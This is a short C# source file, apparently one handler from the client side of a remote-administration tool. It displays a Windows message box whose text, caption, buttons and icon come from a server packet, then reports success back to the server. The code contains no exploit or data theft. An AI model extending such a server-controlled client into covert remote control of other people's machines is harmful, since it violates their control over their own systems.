using Client.Networking.Packets.ClientServices;
using Client.Networking.Packets.MessageBox;

namespace Client.Networking.Handlers
{
    public class MessageBoxHandler : IDisposable
    {
        private readonly Client _client;

        public MessageBoxHandler(Client client)
        {
            _client = client;
        }

        public async Task ShowMessageBox(ShowMessageBoxPacket packet)
        {
            new Thread(() =>
            {
                MessageBox.Show(packet.Text, packet.Caption,
                    (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), packet.Button),
                    (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), packet.Icon),
                    MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly);
            })
            { IsBackground = true }.Start();

            _ = _client.QueuePacketAsync(new StatusClientPacket { Message = "Successfully displayed MessageBox" });
        }
        public void Dispose()
        {
            GC.SuppressFinalize(this);
        }
    }
}
